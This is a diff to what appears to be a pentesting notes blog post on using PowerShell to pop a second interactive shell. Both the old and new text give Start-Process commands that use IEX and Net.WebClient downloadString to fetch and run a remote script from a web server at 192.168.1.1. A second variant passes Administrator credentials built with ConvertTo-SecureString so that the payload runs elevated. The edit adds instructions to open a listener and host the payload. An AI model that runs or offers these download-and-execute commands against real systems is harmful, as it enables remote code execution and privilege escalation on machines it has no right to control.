@@ -8,29 +8,20 @@ layout: post
 ---
 
 
-///
-///
- ///
-  ///
-   ///
-//////// To be tested:
-  ///
- ///
-///
 ###### Start Process with PowerShell
 ```
-How to use powershell to pop a second shell
+How to use powershell to pop a second connection with interactive shell
+Open a listener on 1 port and a web server with payload on another. Then run:
 > Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')"
 
 
-Starting a shell as Administrator (when the permissions are right)
+Starting a shell as Administrator (when the password is known)
 
-First: make a variable of the password.
-Because windows doesnt like it when you pass passwords in plain text to a command.
+First: make a variable of the credentials. Because Windows doesn't like it when you pass passwords in plain text to a command
 > $SecPass = ConvertTo-SecureString "password" -AsPlainText -Force
 > $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
 
-Pop the shell:
+Then pop the shell
 > Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')" -Credential $cred
 ```
 
